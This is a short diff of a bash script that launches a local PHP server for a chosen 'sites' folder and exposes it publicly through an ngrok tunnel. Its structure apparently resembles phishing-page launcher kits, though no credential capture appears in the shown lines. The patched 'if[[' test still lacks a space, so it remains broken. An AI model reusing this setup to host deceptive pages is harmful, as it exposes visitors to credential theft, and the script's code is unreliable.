@@ -398,7 +398,7 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:5555
+cd sites/$server && php -S 127.0.0.1:5555 &
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ngrok_bin=$(command -v ngrok)
@@ -425,7 +425,7 @@ break
 fi
 sleep 1
 done
-if[[ "$ngrok_flag"!=true ]];then
+if[[ "$ngrok_flag" != true ]];then
 printf "\e[1;91m[!]\e[0m ngrok failed to run or no tunnel was created.\n"
 return 1
 fi
